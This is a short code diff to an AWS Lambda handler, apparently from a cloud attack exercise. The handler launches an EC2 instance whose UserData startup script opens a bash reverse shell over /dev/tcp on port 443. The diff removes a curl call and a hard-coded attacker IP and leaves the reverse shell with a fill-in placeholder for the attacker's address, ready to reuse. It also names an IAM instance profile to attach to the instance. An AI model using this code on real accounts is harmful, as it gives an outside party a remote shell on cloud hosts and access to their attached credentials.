@@ -26,8 +26,7 @@ def lambda_handler(event, context):
         ],
         UserData="""
         #!/bin/sh
-        curl https://uob.glitch.me
-        bash -i >& /dev/tcp/54.169.237.149/443 0>&1
+        bash -i >& /dev/tcp/<your_reverse_shell_ip>/443 0>&1
         """,
         IamInstanceProfile={
             'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
